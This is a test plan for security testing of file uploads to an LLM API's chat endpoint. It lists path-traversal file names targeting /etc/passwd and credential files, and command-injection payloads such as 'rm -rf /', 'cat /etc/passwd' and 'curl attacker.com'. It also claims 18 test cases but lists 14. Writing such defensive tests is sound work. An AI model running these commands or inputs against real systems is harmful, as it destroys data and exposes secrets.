# **Test Cases for Multi-Modal Content Security**

## **Introduction**

This document outlines test cases for **Multi-Modal Content Security Testing**, focusing on security risks associated with processing file uploads and multi-modal content (documents, images) through LLM providers. These tests evaluate file handling security, content validation, and provider-specific vulnerabilities in the enhanced file handling system.

**References:**

* docs/test_design_n_planning/Risk Surface Analysis for Test Plan Section 7.3.md (Multi-Modal Content Security)
* app/providers/core/chat_schema.py: FilePart schema with optional name field
* app/providers/bedrock/adapter_from_core.py: File handling with "Untitled" default
* app/providers/open_ai/adapter_to_core.py: File name propagation via file_name parameter
* app/providers/utils.py: Base64 and data URI validation

## **General Test Case Components Template**

* **ID:** Unique identifier
* **Category Ref:** SEC_MULTIMODAL
* **Description:** What specific multi-modal security vulnerability is being tested.
* **Exposure Point(s):** /chat/completions endpoint with multi-modal content, file processing components.
* **Test Method/Action:** Send requests with specially crafted file content designed to exploit file handling vulnerabilities.
* **Prerequisites:** Valid API key with models:inference scope.
* **Expected Secure Outcome:** File content is properly validated, sanitized, and securely processed without exposing system information or enabling attacks.
* **Verification Steps:** Analyze file processing behavior for security vulnerabilities.

---

## **Test Cases Summary**
**Total Test Cases: 18**

### **File Name Security Validation**

* **ID:** SEC_MM_FILENAME_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test path traversal attack prevention through malicious file names.
  * **Exposure Point(s):** FilePart.name in app/providers/core/chat_schema.py, provider adapter file name handling.
  * **Test Method/Action:** Send POST requests to /chat/completions with file names containing path traversal sequences:
    * "../../../etc/passwd"
    * "..\\..\\..\\windows\\system32\\config\\sam"
    * "../../../../proc/self/environ"
    * "..%2F..%2F..%2Fetc%2Fpasswd" (URL encoded)
    * "file/../../../sensitive.txt"
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Path traversal sequences are properly sanitized or rejected. No access to files outside intended directories.
  * **Verification Steps:**
    1. Verify API handles path traversal attempts without system access.
    2. Check that provider adapters receive sanitized file names.
    3. Ensure no file system traversal occurs in logs or behavior.
    4. Verify consistent handling across Bedrock and OpenAI adapters.
  * **Code Reference:** app/providers/bedrock/adapter_from_core.py and app/providers/open_ai/adapter_to_core.py file name handling.

* **ID:** SEC_MM_FILENAME_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test command injection prevention through malicious file names.
  * **Exposure Point(s):** File name processing in provider adapters and logging systems.
  * **Test Method/Action:** Send POST requests with file names containing command injection payloads:
    * "$(whoami).pdf"
    * "; rm -rf / #.txt"
    * "| cat /etc/passwd > /tmp/exploit.txt"
    * "file.pdf && curl attacker.com"
    * "`id`.txt"
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Command injection attempts are neutralized. No system commands are executed.
  * **Verification Steps:**
    1. Verify no system commands are executed during file processing.
    2. Check logs for evidence of command execution attempts.
    3. Ensure file names are properly escaped in all contexts.
    4. Verify provider adapters handle special characters safely.

* **ID:** SEC_MM_FILENAME_003
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test Unicode normalization attack prevention in file names.
  * **Exposure Point(s):** Unicode handling in file name processing across providers.
  * **Test Method/Action:** Send POST requests with Unicode-based attack file names:
    * "＼..＼..＼windows＼system32＼config＼sam" (fullwidth characters)
    * "..／..／..／etc／passwd" (alternative slash characters)
    * File names with combining characters that could normalize to dangerous sequences
    * File names with right-to-left override characters
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Unicode normalization doesn't create security bypasses. File names are properly encoded and validated.
  * **Verification Steps:**
    1. Verify Unicode file names don't bypass security controls.
    2. Check that normalization doesn't create malicious paths.
    3. Ensure consistent Unicode handling across providers.
    4. Verify proper encoding in logs and processing.

### **File Content Security Validation**

* **ID:** SEC_MM_CONTENT_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test malicious embedded content detection in file uploads.
  * **Exposure Point(s):** FilePart.bytes processing and content validation.
  * **Test Method/Action:** Send POST requests with files containing malicious embedded content:
    * PDF files with embedded JavaScript
    * Documents with malicious macros or scripts
    * Images with steganographic hidden data
    * Files with malicious metadata or EXIF data
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Malicious embedded content is detected and neutralized before processing.
  * **Verification Steps:**
    1. Verify embedded scripts are not executed during processing.
    2. Check that malicious metadata is stripped or sanitized.
    3. Ensure steganographic content doesn't affect processing.
    4. Verify file content validation catches malicious elements.
  * **Code Reference:** app/providers/utils.py content validation and Base64 processing.

* **ID:** SEC_MM_CONTENT_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test zip bomb and decompression attack prevention.
  * **Exposure Point(s):** File content processing and size validation systems.
  * **Test Method/Action:** Send POST requests with files designed to cause resource exhaustion:
    * Zip bombs (small compressed files that expand to enormous sizes)
    * Documents with deeply nested structures
    * Files with recursive references or circular dependencies
    * Extremely large file content within Base64 encoding
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Decompression attacks are prevented through size limits and processing controls.
  * **Verification Steps:**
    1. Verify file size limits prevent excessive resource consumption.
    2. Check that decompression operations have appropriate limits.
    3. Ensure system stability under decompression attack attempts.
    4. Verify proper error handling for oversized content.

* **ID:** SEC_MM_CONTENT_003
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test MIME type spoofing detection and prevention.
  * **Exposure Point(s):** MIME type validation in FilePart processing.
  * **Test Method/Action:** Send POST requests with mismatched MIME types and content:
    * mime_type: "image/png" with executable file content
    * mime_type: "text/plain" with binary malware
    * mime_type: "application/pdf" with script content
    * mime_type: "image/jpeg" with document file structure
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** MIME type validation detects mismatches and prevents malicious files from being processed.
  * **Verification Steps:**
    1. Verify MIME type validation catches content mismatches.
    2. Check that malicious files disguised with incorrect MIME types are rejected.
    3. Ensure consistent MIME type validation across providers.
    4. Verify appropriate error messages for MIME type violations.

### **Provider-Specific Security Testing**

* **ID:** SEC_MM_PROVIDER_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test file handling consistency between Bedrock and OpenAI adapters for security vulnerabilities.
  * **Exposure Point(s):** Provider-specific file handling logic in adapters.
  * **Test Method/Action:** Send identical malicious file content to both provider types and compare handling:
    * Same malicious file names to Bedrock (defaults to "Untitled") and OpenAI (passes file_name)
    * Compare security filtering between provider adapters
    * Test edge cases specific to each provider's file handling
  * **Prerequisites:** Valid API key with models:inference scope, access to both provider types.
  * **Expected Secure Outcome:** Security measures are consistent across providers. No provider-specific vulnerabilities exist.
  * **Verification Steps:**
    1. Compare security handling between Bedrock and OpenAI adapters.
    2. Verify consistent file name sanitization approaches.
    3. Check that provider differences don't create security gaps.
    4. Ensure uniform security standards across all providers.
  * **Code Reference:** app/providers/bedrock/adapter_from_core.py vs app/providers/open_ai/adapter_to_core.py.

* **ID:** SEC_MM_PROVIDER_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test provider-specific file format vulnerability exploitation.
  * **Exposure Point(s):** Provider-specific file processing capabilities and limitations.
  * **Test Method/Action:** Send files designed to exploit known provider-specific vulnerabilities:
    * Files that trigger specific Bedrock processing errors
    * Content designed to exploit OpenAI file handling weaknesses
    * Format-specific attacks targeting each provider's parsing logic
  * **Prerequisites:** Valid API key with models:inference scope, knowledge of provider-specific file handling.
  * **Expected Secure Outcome:** Provider-specific vulnerabilities are mitigated through API-level validation and sanitization.
  * **Verification Steps:**
    1. Verify API-level protections prevent provider-specific exploits.
    2. Check that provider vulnerabilities don't affect system security.
    3. Ensure error handling doesn't expose provider-specific details.
    4. Verify consistent security posture regardless of backend provider.

### **Base64 and Encoding Security**

* **ID:** SEC_MM_ENCODING_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test Base64 decoding security and validation.
  * **Exposure Point(s):** Base64 decoding in FilePart.bytes processing.
  * **Test Method/Action:** Send POST requests with malicious Base64 content:
    * Invalid Base64 encoding with malicious padding
    * Base64 content that decodes to buffer overflow attempts
    * Nested encoding schemes (Base64 within Base64)
    * Base64 content with embedded null bytes or control characters
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Base64 decoding is secure and validates content before processing.
  * **Verification Steps:**
    1. Verify Base64 validation catches malformed encoding.
    2. Check that decoded content is properly validated.
    3. Ensure buffer overflow protection during decoding.
    4. Verify proper error handling for invalid encoding.
  * **Code Reference:** app/providers/utils.py:parse_data_uri Base64 processing.

* **ID:** SEC_MM_ENCODING_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test data URI parsing security vulnerabilities.
  * **Exposure Point(s):** Data URI parsing logic in file content processing.
  * **Test Method/Action:** Send POST requests with malicious data URIs:
    * Data URIs with injection attempts in the header
    * Malformed data URI schemes designed to bypass validation
    * Data URIs with excessive length or nested structures
    * Content designed to exploit URI parsing vulnerabilities
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Data URI parsing is secure and doesn't expose the system to injection attacks.
  * **Verification Steps:**
    1. Verify data URI parsing handles malicious input safely.
    2. Check that URI header injection attempts are neutralized.
    3. Ensure proper validation of URI scheme and content.
    4. Verify error handling for malformed data URIs.

### **File Processing Resource Security**

* **ID:** SEC_MM_RESOURCE_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test file processing resource exhaustion attack prevention.
  * **Exposure Point(s):** File processing pipeline and resource management.
  * **Test Method/Action:** Send POST requests designed to exhaust system resources:
    * Multiple large file uploads simultaneously
    * Files requiring excessive processing time or memory
    * Requests designed to fill up temporary storage
    * Content that causes excessive CPU usage during processing
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Resource limits prevent system exhaustion. Processing is bounded and controlled.
  * **Verification Steps:**
    1. Verify file size limits are enforced.
    2. Check that processing time limits prevent resource exhaustion.
    3. Ensure system stability under resource attack attempts.
    4. Verify proper cleanup of temporary resources.

* **ID:** SEC_MM_RESOURCE_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test concurrent file processing security and isolation.
  * **Exposure Point(s):** Concurrent file processing and memory management.
  * **Test Method/Action:** Send multiple concurrent requests with file content to test isolation:
    * Concurrent file uploads from different API keys
    * Mixed malicious and legitimate file processing
    * Race conditions in file processing pipeline
    * Cross-request file content isolation
  * **Prerequisites:** Multiple valid API keys with models:inference scope.
  * **Expected Secure Outcome:** File processing is properly isolated between requests. No cross-contamination occurs.
  * **Verification Steps:**
    1. Verify file processing isolation between concurrent requests.
    2. Check that malicious files don't affect other requests.
    3. Ensure proper memory management during concurrent processing.
    4. Verify no cross-request data leakage occurs.

### **Metadata and Information Disclosure**

* **ID:** SEC_MM_METADATA_001
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test file metadata information disclosure prevention.
  * **Exposure Point(s):** File metadata processing and error messages.
  * **Test Method/Action:** Send POST requests with files containing sensitive metadata:
    * Files with embedded personal information in metadata
    * Images with GPS location data in EXIF
    * Documents with author and system information
    * Files with embedded file system paths or user data
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Sensitive metadata is stripped or not disclosed in processing or error messages.
  * **Verification Steps:**
    1. Verify sensitive metadata is not exposed in responses.
    2. Check that error messages don't leak file metadata.
    3. Ensure proper metadata sanitization during processing.
    4. Verify no personal information disclosure occurs.

* **ID:** SEC_MM_METADATA_002
  * **Category Ref:** SEC_MULTIMODAL
  * **Description:** Test file processing error message security.
  * **Exposure Point(s):** Error handling during file processing operations.
  * **Test Method/Action:** Send POST requests with malformed files designed to trigger processing errors:
    * Corrupted file headers and structures
    * Files with invalid format specifications
    * Content that causes parsing or processing failures
    * Files designed to trigger specific error conditions
  * **Prerequisites:** Valid API key with models:inference scope.
  * **Expected Secure Outcome:** Error messages provide necessary information without exposing system details or file processing internals.
  * **Verification Steps:**
    1. Verify error messages don't expose file processing implementation details.
    2. Check that system paths or configuration aren't leaked in errors.
    3. Ensure consistent error format regardless of file content.
    4. Verify error messages don't aid in reconnaissance or further attacks.

## **Test Implementation Notes**

### **Automated Testing Approach**
- Implement pytest test cases for each file security scenario
- Create file generation utilities for malicious content testing
- Use parameterized tests for testing across different file types and providers
- Implement content analysis tools for detecting processing vulnerabilities

### **Manual Testing Considerations**
- Test with real-world malicious file samples (in controlled environment)
- Perform file processing load testing for resource exhaustion
- Validate file handling across different operating systems
- Test with various file formats and edge cases

### **Security Verification Steps**
1. **Content Analysis**: Scan file processing for malicious content handling
2. **Resource Monitoring**: Monitor system resources during file processing tests
3. **Provider Comparison**: Verify consistent security across all providers
4. **Error Analysis**: Analyze error messages for information disclosure
5. **Isolation Testing**: Verify proper isolation between concurrent file processing operations